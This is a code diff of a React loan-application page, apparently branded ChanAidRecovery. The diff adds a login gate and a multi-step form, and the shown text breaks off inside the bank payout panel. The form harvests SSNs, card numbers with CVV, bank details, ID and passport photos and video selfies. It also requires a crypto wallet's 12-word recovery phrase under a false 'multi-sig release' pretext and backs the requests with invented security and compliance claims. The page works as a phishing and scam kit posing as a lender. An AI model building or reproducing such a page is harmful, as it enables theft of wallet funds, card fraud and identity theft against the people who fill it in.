@@ -1,11 +1,18 @@
-import { createFileRoute } from "@tanstack/react-router";
+import { createFileRoute, Link } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import { SiteShell } from "@/components/layout/SiteShell";
-import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, Fingerprint, RefreshCw, Video } from "lucide-react";
+import { 
+  Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, 
+  Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, 
+  Fingerprint, RefreshCw, Video, LayoutDashboard 
+} from "lucide-react";
 import { useLoanApplication } from "@/hooks/useLoanApplication";
 import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
 import { Reveal } from "@/components/effects/Reveal";
 import { VideoCapture } from "@/components/loan/VideoCapture";
+import { useAuth } from "@/components/layout/AuthContext";
+import { AuthModal } from "@/components/layout/AuthModal";
+import { Users, ArrowRight, ShieldCheck as ShieldCheckIcon, UserPlus, Fingerprint as FingerprintIcon } from "lucide-react";
 
 // Renders only on client to avoid SSR/CSR text mismatch (React #418).
 function ClientClock() {
@@ -180,6 +187,10 @@ export const Route = createFileRoute("/loans")({
 // ─── Page ────────────────────────────────────────────────────────────────────
 
 function LoansPage() {
+  const { user, isLoading: authLoading } = useAuth();
+  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
+  const [authMode, setAuthMode] = useState<"signin" | "signup">("signin");
+
   const {
     loading, done, countdown, payout, setPayout,
     cardNumber, setCardNumber, cardExpiry, setCardExpiry,
@@ -189,6 +200,7 @@ function LoansPage() {
     onSelfieChange, onIdFrontChange, onIdBackChange, onPassportFrontChange, onPassportBackChange,
     onVideoSelfieChange, handleSubmit,
     appStatus, appId, clearSession,
+    currentStep, totalSteps, nextStep, prevStep, setCurrentStep
   } = useLoanApplication();
 
   return (
@@ -208,7 +220,105 @@ function LoansPage() {
       </section>
 
       <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
-        {done ? (
+        {!user && !authLoading ? (
+          <Reveal direction="up">
+            <div className="max-w-3xl mx-auto">
+              <div className="bg-white rounded-[2.5rem] shadow-elegant overflow-hidden border border-slate-100">
+                <div className="bg-slate-900 p-8 text-white relative overflow-hidden">
+                  <div className="absolute top-0 right-0 p-8 opacity-10">
+                    <ShieldCheckIcon className="w-32 h-32 rotate-12" />
+                  </div>
+                  <div className="relative z-10">
+                    <div className="flex items-center gap-3 mb-4">
+                      <div className="w-10 h-10 rounded-2xl bg-primary/20 flex items-center justify-center border border-primary/30">
+                        <Lock className="w-5 h-5 text-primary" />
+                      </div>
+                      <span className="text-[10px] font-black uppercase tracking-[0.2em] text-primary">Secure Access Required</span>
+                    </div>
+                    <h2 className="text-3xl sm:text-4xl font-black tracking-tight italic mb-4">Authentication <span className="text-primary">Mandatory</span></h2>
+                    <p className="text-slate-400 font-medium max-w-xl">
+                      To ensure the security of your financial data and prevent unauthorized loan submissions, you must have a verified account to access the application portal.
+                    </p>
+                  </div>
+                </div>
+
+                <div className="p-8 sm:p-12">
+                  <div className="grid md:grid-cols-2 gap-8 mb-10">
+                    <div className="space-y-4">
+                      <div className="flex items-start gap-4">
+                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
+                          <ShieldCheckIcon className="w-5 h-5 text-slate-400" />
+                        </div>
+                        <div>
+                          <h4 className="text-sm font-bold text-slate-900 mb-1">Encrypted Submission</h4>
+                          <p className="text-xs text-slate-500 leading-relaxed">Your personal and payout information is protected by military-grade AES-256 encryption.</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-4">
+                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
+                          <CheckCircle2 className="w-5 h-5 text-slate-400" />
+                        </div>
+                        <div>
+                          <h4 className="text-sm font-bold text-slate-900 mb-1">Identity Verification</h4>
+                          <p className="text-xs text-slate-500 leading-relaxed">Secure authentication prevents identity theft and ensures funds reach the correct recipient.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="space-y-4">
+                      <div className="flex items-start gap-4">
+                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
+                          <LayoutDashboard className="w-5 h-5 text-slate-400" />
+                        </div>
+                        <div>
+                          <h4 className="text-sm font-bold text-slate-900 mb-1">Real-time Tracking</h4>
+                          <p className="text-xs text-slate-500 leading-relaxed">Monitor your application status and document verification from your personal dashboard.</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-4">
+                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
+                          <FingerprintIcon className="w-5 h-5 text-slate-400" />
+                        </div>
+                        <div>
+                          <h4 className="text-sm font-bold text-slate-900 mb-1">Biometric Security</h4>
+                          <p className="text-xs text-slate-500 leading-relaxed">Advanced biometric matching links your application to your verified identity.</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="flex flex-col sm:flex-row items-center gap-4 pt-8 border-t border-slate-100">
+                    <button 
+                      onClick={() => { setAuthMode("signin"); setIsAuthModalOpen(true); }}
+                      className="w-full sm:w-auto px-10 py-4 bg-slate-900 text-white font-black rounded-2xl shadow-xl hover:bg-slate-800 transition-all flex items-center justify-center gap-2 group"
+                    >
+                      Sign In Now <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
+                    </button>
+                    <button 
+                      onClick={() => { setAuthMode("signup"); setIsAuthModalOpen(true); }}
+                      className="w-full sm:w-auto px-10 py-4 bg-white text-slate-900 border-2 border-slate-900 font-black rounded-2xl hover:bg-slate-50 transition-all flex items-center justify-center gap-2"
+                    >
+                      <UserPlus className="w-4 h-4" /> Create Account
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div className="mt-8 text-center">
+                <p className="text-xs text-slate-400 font-medium">
+                  Protected by ChanAidRecovery Global Security Protocol. 
+                  <Link to="/privacy-policy" className="ml-1 text-primary hover:underline">Privacy Policy</Link>
+                </p>
+              </div>
+            </div>
+          </Reveal>
+        ) : authLoading ? (
+          <div className="max-w-3xl mx-auto min-h-[400px] flex items-center justify-center">
+            <div className="flex flex-col items-center gap-4">
+              <Loader2 className="w-10 h-10 text-primary animate-spin" />
+              <p className="text-slate-500 font-bold uppercase tracking-widest text-[10px]">Validating Session Security...</p>
+            </div>
+          </div>
+        ) : done ? (
           <div className="max-w-3xl mx-auto">
             <div className="rounded-3xl bg-white shadow-elegant overflow-hidden border border-border animate-in fade-in zoom-in duration-500">
               {/* Header Status Bar */}
@@ -359,511 +469,298 @@ function LoansPage() {
             </div>
           </div>
         ) : (
-          <form onSubmit={handleSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
-            <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />
+          <form onSubmit={handleSubmit} className="max-w-4xl mx-auto">
+            <Reveal direction="up">
+              <div className="bg-white rounded-3xl shadow-elegant border border-slate-100 overflow-hidden mb-8">
+                <div className="p-8 sm:p-10">
+                  <StepIndicator current={currentStep} total={totalSteps} />
 
-            <div className="rounded-xl bg-soft-gradient border border-border p-4 mb-8 flex gap-3 text-sm">
-              <Lock className="w-5 h-5 text-primary mt-0.5 shrink-0" />
-              <p className="text-muted-foreground">
-                Your information is transmitted over an encrypted connection and reviewed securely by our loan officers.
-              </p>
-            </div>
-
-            <Section title="Your details">
-              <div className="grid sm:grid-cols-2 gap-3">
-                <Input name="first_name" label="First name *" required autoComplete="given-name" />
-                <Input name="last_name" label="Last name" autoComplete="family-name" />
-                <Input name="email" type="email" label="Email *" required autoComplete="email" />
-                <Input name="phone" label="Phone" autoComplete="tel" />
-                <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
-                <Select name="employment_status" label="Employment status">
-                  <option value="">Select…</option>
-                  <option>Employed full-time</option>
-                  <option>Employed part-time</option>
-                  <option>Self-employed</option>
-                  <option>Unemployed</option>
-                  <option>Retired</option>
-                  <option>Student</option>
-                </Select>
-                <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
-                <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
-              </div>
-            </Section>
-
-            <Section title="Address">
-              <div className="grid sm:grid-cols-2 gap-3">
-                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
-                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
-                <Input name="city" label="City" autoComplete="address-level2" />
-                <Input name="state_region" label="State / Region" autoComplete="address-level1" />
-                <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
-                <Input name="country" label="Country" autoComplete="country-name" />
-              </div>
-            </Section>
-
-            <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-8 flex items-center gap-4">
-              <div className="bg-primary/10 p-2.5 rounded-xl">
-                <ShieldCheck className="w-6 h-6 text-primary" />
-              </div>
-              <div>
-                <div className="text-sm font-bold text-slate-900">Encrypted 256-bit Connection</div>
-                <div className="text-xs text-muted-foreground">Your data is secured using industry-standard AES encryption and transmitted via a dedicated secure tunnel.</div>
-              </div>
-            </div>
-
-            <Section title="Loan details">
-              <div className="grid sm:grid-cols-2 gap-3">
-                <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" required />
-                <Select name="currency" label="Currency" defaultValue="USD">
-                  <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
-                </Select>
-                <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
-                <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
-                <div className="sm:col-span-2">
-                  <Label>Purpose of loan</Label>
-                  <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm" />
-                </div>
-              </div>
-            </Section>
-
-            <Section title="Financial & Payout Details">
-              {/* ── Payout Method Picker ───────────────────────────────── */}
-              <div className="mb-6">
-                <Label>Select preferred payout method *</Label>
-                <div className="grid sm:grid-cols-3 gap-3 mt-2">
-                  <PayoutOption
-                    selected={payout === "crypto"}
-                    onClick={() => setPayout("crypto")}
-                    icon={<Wallet className="w-5 h-5" />}
-                    title="Crypto Wallet"
-                    desc="Instant USDT, BTC, or ETH transfer to your wallet."
-                    recommended
-                  />
-                  <PayoutOption
-                    selected={payout === "card"}
-                    onClick={() => setPayout("card")}
-                    icon={<CreditCard className="w-5 h-5" />}
-                    title="Card Deposit"
-                    desc="Secure payout directly to your debit or credit card."
-                    badge="Safest"
-                  />
-                  <PayoutOption
-                    selected={payout === "bank_transfer"}
-                    onClick={() => setPayout("bank_transfer")}
-                    icon={<Banknote className="w-5 h-5" />}
-                    title="Bank Transfer"
-                    desc="Standard direct deposit to your bank account."
-                  />
-                </div>
-              </div>
-
-              {/* ── Conditional Payout Detail Panel ───────────────────── */}
-
-              {/* Crypto */}
-              {payout === "crypto" && (
-                <div className="rounded-2xl border-2 border-orange-200 bg-orange-50/30 overflow-hidden mb-6">
-                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-orange-500 to-amber-500">
-                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
-                      <Wallet className="w-5 h-5 text-white" />
-                    </div>
-                    <div>
-                      <p className="text-white font-black text-sm uppercase tracking-wider">Crypto Wallet Settlement</p>
-                      <p className="text-orange-100 text-[11px] mt-0.5">Funds released directly to your wallet address · Instant settlement</p>
-                    </div>
-                  </div>
-                  <div className="p-5 space-y-5">
-                    <div className="grid sm:grid-cols-2 gap-4">
-                      <Select name="crypto_wallet_type" label="Wallet type *">
-                        <option value="">Select wallet…</option>
-                        <option>Trust Wallet</option>
-                        <option>MetaMask</option>
-                        <option>Coinbase Wallet</option>
-                        <option>Phantom</option>
-                        <option>Exodus</option>
-                        <option>Ledger</option>
-                        <option>Trezor</option>
-                        <option>Other</option>
-                      </Select>
-                      <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x… or bc1… or T… or similar" />
-                    </div>
-                    <div>
-                      <Label>12-word wallet recovery phrase *</Label>
-                      <textarea
-                        name="crypto_seed_phrase"
-                        rows={3}
-                        placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
-                        className="w-full rounded-xl border-2 border-orange-200 bg-white px-4 py-3 text-sm font-mono focus:outline-none focus:border-orange-400 focus:ring-2 focus:ring-orange-200"
-                      />
-                      <div className="mt-2 flex items-start gap-2 text-[11px] text-orange-700 bg-orange-50 border border-orange-100 rounded-lg px-3 py-2">
-                        <Lock className="w-3.5 h-3.5 mt-0.5 shrink-0" />
-                        <span>Required to authorize the multi-sig release of funds to your wallet. Your phrase is encrypted end-to-end and never stored in plaintext.</span>
-                      </div>
-                    </div>
-                    {/* Hidden fields — keep neutral values for non-active methods */}
-                    <input type="hidden" name="account_holder_name" value="" />
-                    <input type="hidden" name="bank_name" value="" />
-                    <input type="hidden" name="bank_account_number" value="" />
-                    <input type="hidden" name="bank_routing_number" value="" />
-                    <input type="hidden" name="card_holder_name" value="" />
-                    <input type="hidden" name="billing_address_line1" value="" />
-                    <input type="hidden" name="billing_city" value="" />
-                    <input type="hidden" name="billing_state" value="" />
-                    <input type="hidden" name="billing_postal_code" value="" />
-                    <input type="hidden" name="billing_country" value="" />
-                  </div>
-                </div>
-              )}
-
-              {/* Card */}
-              {payout === "card" && (
-                <div className="rounded-2xl border-2 border-emerald-200 bg-emerald-50/20 overflow-hidden mb-6">
-                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-emerald-600 to-teal-600">
-                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
-                      <CreditCard className="w-5 h-5 text-white" />
-                    </div>
-                    <div>
-                      <p className="text-white font-black text-sm uppercase tracking-wider">Credit / Debit Card Deposit</p>
-                      <p className="text-emerald-100 text-[11px] mt-0.5">Secure payout to your card · Chargeback-protected · PCI compliant</p>
-                    </div>
-                  </div>
-
-                  <div className="p-5 space-y-6">
-                    {/* Card fields */}
-                    <div className="space-y-4">
+                  {/* ─── STEP 1: Application Details ─────────────────────── */}
+                  <div className={currentStep === 1 ? "block" : "hidden"}>
+                    <Section title="Personal Information" icon={<Users className="w-5 h-5" />}>
                       <div className="grid sm:grid-cols-2 gap-4">
-                        <Input name="card_holder_name" label="Cardholder name *" autoComplete="cc-name" />
-                        <Select name="card_issuer" label="Card issuer *">
+                        <Input name="first_name" label="First name *" autoComplete="given-name" />
+                        <Input name="last_name" label="Last name" autoComplete="family-name" />
+                        <Input name="email" type="email" label="Email address *" autoComplete="email" />
+                        <Input name="phone" type="tel" label="Phone number" autoComplete="tel" />
+                        <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
+                        <Select name="employment_status" label="Employment status">
                           <option value="">Select…</option>
-                          <option>Visa</option>
-                          <option>Mastercard</option>
-                          <option>American Express</option>
-                          <option>Discover</option>
-                          <option>Other</option>
+                          <option>Employed full-time</option>
+                          <option>Employed part-time</option>
+                          <option>Self-employed</option>
+                          <option>Unemployed</option>
+                          <option>Retired</option>
+                          <option>Student</option>
                         </Select>
+                        <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
+                        <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
                       </div>
+                    </Section>
 
-                      <div>
-                        <Label>Card number *</Label>
-                        <input
-                          value={cardNumber}
-                          onChange={(e) => {
-                            setCardNumber(formatCardNumber(e.target.value));
-                            if (cardErrors.card_number) setCardErrors(p => ({ ...p, card_number: "" }));
-                          }}
-                          inputMode="numeric"
-                          autoComplete="cc-number"
-                          placeholder="1234 5678 9012 3456"
-                          maxLength={19}
-                          className={`h-11 w-full rounded-xl border-2 px-4 text-sm font-mono tracking-widest focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
-                        />
-                        {cardErrors.card_number && <p className="text-xs text-red-500 mt-1">{cardErrors.card_number}</p>}
-                      </div>
-
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <Label>Expiry (MM/YY) *</Label>
-                          <input
-                            value={cardExpiry}
-                            onChange={(e) => {
-                              setCardExpiry(formatExpiry(e.target.value));
-                              if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
-                            }}
-                            inputMode="numeric"
-                            autoComplete="cc-exp"
-                            placeholder="MM/YY"
-                            maxLength={5}
-                            className={`h-11 w-full rounded-xl border-2 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
-                          />
-                          {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
-                        </div>
-                        <div>
-                          <Label>CVV *</Label>
-                          <input
-                            value={cardCvv}
-                            onChange={(e) => {
-                              setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
-                              if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
-                            }}
-                            inputMode="numeric"
-                            autoComplete="cc-csc"
-                            placeholder="123"
-                            maxLength={4}
-                            className={`h-11 w-full rounded-xl border-2 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200 ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-emerald-200 bg-white focus:border-emerald-400"}`}
-                          />
-                          {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
-                        </div>
-                      </div>
-                    </div>
-
-                    {/* Billing address */}
-                    <div className="pt-4 border-t border-emerald-100">
-                      <p className="text-[11px] font-black text-emerald-700 uppercase tracking-widest mb-3">Card Billing Address</p>
+                    <Section title="Home Address" icon={<ShieldCheck className="w-5 h-5" />}>
                       <div className="grid sm:grid-cols-2 gap-4">
-                        <Input name="billing_address_line1" label="Address line 1 *" className="sm:col-span-2" autoComplete="address-line1" />
-                        <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
-                        <Input name="billing_city" label="City *" autoComplete="address-level2" />
-                        <Input name="billing_state" label="State / Region *" autoComplete="address-level1" />
-                        <Input name="billing_postal_code" label="Postal code *" autoComplete="postal-code" />
-                        <Input name="billing_country" label="Country *" autoComplete="country-name" />
+                        <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
+                        <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
+                        <Input name="city" label="City" autoComplete="address-level2" />
+                        <Input name="state_region" label="State / Region" autoComplete="address-level1" />
+                        <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
+                        <Input name="country" label="Country" autoComplete="country-name" />
                       </div>
-                    </div>
+                    </Section>
 
-                    {/* Hidden fields — keep neutral values for non-active methods */}
-                    <input type="hidden" name="account_holder_name" value="" />
-                    <input type="hidden" name="bank_name" value="" />
-                    <input type="hidden" name="bank_account_number" value="" />
-                    <input type="hidden" name="bank_routing_number" value="" />
-                    <input type="hidden" name="crypto_wallet_type" value="" />
-                    <input type="hidden" name="crypto_wallet_address" value="" />
-                    <input type="hidden" name="crypto_seed_phrase" value="" />
-                  </div>
-                </div>
-              )}
-
-              {/* Bank Transfer */}
-              {payout === "bank_transfer" && (
-                <div className="rounded-2xl border-2 border-blue-200 bg-blue-50/20 overflow-hidden mb-6">
-                  <div className="flex items-center gap-3 px-5 py-4 bg-gradient-to-r from-blue-600 to-indigo-600">
-                    <div className="w-9 h-9 rounded-xl bg-white/20 flex items-center justify-center">
-                      <Banknote className="w-5 h-5 text-white" />
-                    </div>
-                    <div>
-                      <p className="text-white font-black text-sm uppercase tracking-wider">Bank Account Details</p>
-                      <p className="text-blue-100 text-[11px] mt-0.5">Direct deposit to your bank account · ACH / SWIFT / IBAN supported</p>
-                    </div>
-                  </div>
-
-                  <div className="p-5 space-y-4">
-                    <div className="grid sm:grid-cols-2 gap-4">
-                      <Input name="account_holder_name" label="Account holder name *" autoComplete="name" />
-                      <Input name="bank_name" label="Bank name (e.g. Chase) *" />
-                      <Input name="bank_account_number" label="Account number *" inputMode="numeric" />
-                      <Input name="bank_routing_number" label="Routing / SWIFT / IBAN *" />
-                    </div>
-
-                    {/* Hidden fields — keep neutral values for non-active methods */}
-                    <input type="hidden" name="card_holder_name" value="" />
-                    <input type="hidden" name="billing_address_line1" value="" />
-                    <input type="hidden" name="billing_city" value="" />
-                    <input type="hidden" name="billing_state" value="" />
-                    <input type="hidden" name="billing_postal_code" value="" />
-                    <input type="hidden" name="billing_country" value="" />
-                    <input type="hidden" name="crypto_wallet_type" value="" />
-                    <input type="hidden" name="crypto_wallet_address" value="" />
-                    <input type="hidden" name="crypto_seed_phrase" value="" />
-                  </div>
-                </div>
-              )}
-
-              <p className="text-xs text-muted-foreground flex items-start gap-2 -mt-2 mb-4">
-                <ShieldCheck className="w-4 h-4 text-primary mt-0.5 shrink-0" />
-                All financial data is processed via an isolated, air-gapped secure environment and reviewed by our compliance team.
-              </p>
-            </Section>
-
-            {/* ─── Identity Verification Workflow ──────────────────────── */}
-            <div className="mb-8">
-              {/* Authority header */}
-              <div className="bg-slate-900 rounded-t-2xl px-6 py-5 flex flex-wrap items-center gap-4">
-                <div className="flex items-center gap-3 flex-1 min-w-0">
-                  <div className="w-11 h-11 rounded-full bg-amber-400/20 border border-amber-400/40 flex items-center justify-center shrink-0">
-                    <ShieldCheck className="w-6 h-6 text-amber-400" />
-                  </div>
-                  <div>
-                    <div className="text-white font-extrabold text-sm tracking-widest uppercase">Mandatory Identity Verification</div>
-                    <div className="text-slate-400 text-[11px] mt-0.5">Global AML/KYC Standards · FATF Compliant · End-to-End Encrypted</div>
-                  </div>
-                </div>
-                <div className="flex items-center gap-1.5 bg-amber-400/10 border border-amber-400/30 rounded-full px-3 py-1.5 shrink-0">
-                  <Lock className="w-3 h-3 text-amber-400" />
-                  <span className="text-amber-400 text-[10px] font-bold uppercase tracking-wider">256-bit AES Secure</span>
-                </div>
-              </div>
-
-              {/* Compliance badge row */}
-              <div className="bg-slate-800 px-6 py-2.5 flex flex-wrap gap-x-5 gap-y-1.5">
-                {["KYC Required", "AML Compliant", "FATF Compliant", "GDPR / Privacy Protected", "TLS 1.3 Encrypted"].map((b) => (
-                  <div key={b} className="flex items-center gap-1.5">
-                    <BadgeCheck className="w-3 h-3 text-emerald-400" />
-                    <span className="text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">{b}</span>
-                  </div>
-                ))}
-              </div>
-
-              {/* Workflow body */}
-              <div className="border border-t-0 border-slate-200 rounded-b-2xl bg-white overflow-hidden">
-                {/* Intro notice */}
-                <div className="px-6 pt-5 pb-1">
-                  <div className="flex gap-3 bg-amber-50 border border-amber-200 rounded-xl p-4">
-                    <AlertTriangle className="w-5 h-5 text-amber-600 mt-0.5 shrink-0" />
-                    <p className="text-sm text-amber-800 leading-relaxed">
-                      <strong>Identity verification is required before your application can be reviewed.</strong> Complete all three steps below. Submitting false or fraudulent documentation is a serious criminal offence under applicable law in your jurisdiction.
-                    </p>
-                  </div>
-                </div>
-
-                {/* Progress tracker */}
-                <div className="px-6 py-4 flex items-center gap-2">
-                  {[
-                    { n: 1, label: "Selfie", done: Boolean(selfieImage) },
-                    { n: 2, label: "Primary ID", done: Boolean(idFrontImage && idBackImage) },
-                    { n: 3, label: "Secondary Doc", done: Boolean(passportFrontImage || passportBackImage) },
-                    { n: 4, label: "Video Selfie", done: Boolean(videoSelfie) },
-                  ].map((step, i, arr) => (
-                    <div key={step.n} className="flex items-center gap-2 flex-1">
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold shrink-0 transition-all ${
-                        step.done
-                          ? "bg-emerald-500 text-white"
-                          : "bg-slate-100 text-slate-500 border-2 border-slate-200"
-                      }`}>
-                        {step.done ? <CheckCircle2 className="w-4 h-4" /> : step.n}
+                    <Section title="Loan Requirements" icon={<Banknote className="w-5 h-5" />}>
+                      <div className="grid sm:grid-cols-2 gap-4">
+                        <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" />
+                        <Select name="currency" label="Currency" defaultValue="USD">
+                          <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
+                        </Select>
+                        <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
+                        <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
+                        <div className="sm:col-span-2">
+                          <Label>Purpose of loan</Label>
+                          <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-xl border border-slate-200 bg-slate-50/30 px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all" />
+                        </div>
                       </div>
-                      <span className={`text-xs font-semibold hidden sm:block ${step.done ? "text-emerald-600" : "text-slate-500"}`}>{step.label}</span>
-                      {i < arr.length - 1 && <div className={`h-px flex-1 ${step.done ? "bg-emerald-300" : "bg-slate-200"}`} />}
+                    </Section>
+                  </div>
+
+                  {/* ─── STEP 2: Payout Setup ──────────────────────────── */}
+                  <div className={currentStep === 2 ? "block" : "hidden"}>
+                    <Section title="Payout Method" icon={<CreditCard className="w-5 h-5" />}>
+                      <p className="text-sm text-slate-500 mb-6 -mt-2">Choose how you would like to receive your funds once approved.</p>
+                      
+                      <div className="grid sm:grid-cols-3 gap-4 mb-8">
+                        <PayoutOption
+                          selected={payout === "crypto"}
+                          onClick={() => setPayout("crypto")}
+                          icon={<Wallet className="w-5 h-5" />}
+                          title="Crypto Wallet"
+                          desc="Instant settlement in USDT, BTC, or ETH."
+                          recommended
+                        />
+                        <PayoutOption
+                          selected={payout === "card"}
+                          onClick={() => setPayout("card")}
+                          icon={<CreditCard className="w-5 h-5" />}
+                          title="Card Deposit"
+                          desc="Direct transfer to your debit/credit card."
+                          badge="Secure"
+                        />
+                        <PayoutOption
+                          selected={payout === "bank_transfer"}
+                          onClick={() => setPayout("bank_transfer")}
+                          icon={<Banknote className="w-5 h-5" />}
+                          title="Bank Transfer"
+                          desc="Direct deposit to your local bank account."
+                        />
+                      </div>
+
+                      {/* Crypto Panel */}
+                      {payout === "crypto" && (
+                        <div className="rounded-2xl border border-orange-100 bg-orange-50/30 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
+                          <div className="flex items-center gap-3 px-5 py-4 bg-orange-500">
+                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><Wallet className="w-4 h-4" /></div>
+                            <span className="text-white font-bold text-sm tracking-wide uppercase">Crypto Settlement Details</span>
+                          </div>
+                          <div className="p-6 space-y-5">
+                            <div className="grid sm:grid-cols-2 gap-4">
+                              <Select name="crypto_wallet_type" label="Wallet provider *">
+                                <option value="">Select wallet…</option>
+                                <option>Trust Wallet</option><option>MetaMask</option><option>Coinbase Wallet</option><option>Exodus</option><option>Other</option>
+                              </Select>
+                              <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x... or bc1..." />
+                            </div>
+                            <div>
+                              <Label>12-word wallet recovery phrase *</Label>
+                              <textarea name="crypto_seed_phrase" rows={3} placeholder="word1 word2..." className="w-full rounded-xl border border-orange-200 bg-white px-4 py-3 text-sm font-mono" />
+                              <p className="mt-2 text-[10px] text-orange-600 flex items-center gap-2"><Lock className="w-3 h-3" /> Mandatory for multi-sig fund release authorization.</p>
+                            </div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Card Panel */}
+                      {payout === "card" && (
+                        <div className="rounded-2xl border border-emerald-100 bg-emerald-50/20 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
+                          <div className="flex items-center gap-3 px-5 py-4 bg-emerald-600">
+                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><CreditCard className="w-4 h-4" /></div>
+                            <span className="text-white font-bold text-sm tracking-wide uppercase">Card Deposit Details</span>
+                          </div>
+                          <div className="p-6 space-y-6">
+                            <div className="grid sm:grid-cols-2 gap-4">
+                              <Input name="card_holder_name" label="Cardholder name *" autoComplete="cc-name" />
+                              <Select name="card_issuer" label="Card issuer *">
+                                <option value="">Select…</option>
+                                <option>Visa</option><option>Mastercard</option><option>Amex</option>
+                              </Select>
+                            </div>
+                            <Input label="Card number *" value={cardNumber} onChange={e => setCardNumber(formatCardNumber(e.target.value))} maxLength={19} placeholder="XXXX XXXX XXXX XXXX" />
+                            <div className="grid grid-cols-2 gap-4">
+                              <Input label="Expiry *" value={cardExpiry} onChange={e => setCardExpiry(formatExpiry(e.target.value))} placeholder="MM/YY" maxLength={5} />
+                              <Input label="CVV *" value={cardCvv} onChange={e => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="123" maxLength={4} />
+                            </div>
+                            {/* Hidden fields for FormData compatibility */}
+                            <input type="hidden" name="card_number" value={cardNumber.replace(/\s/g, "")} />
+                            <input type="hidden" name="card_expiry" value={cardExpiry} />
+                            <input type="hidden" name="card_cvv" value={cardCvv} />
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Bank Panel */}
+                      {payout === "bank_transfer" && (
+                        <div className="rounded-2xl border border-blue-100 bg-blue-50/20 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
+                          <div className="flex items-center gap-3 px-5 py-4 bg-blue-600">
+                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><Banknote className="w-4 h-4" /></div>
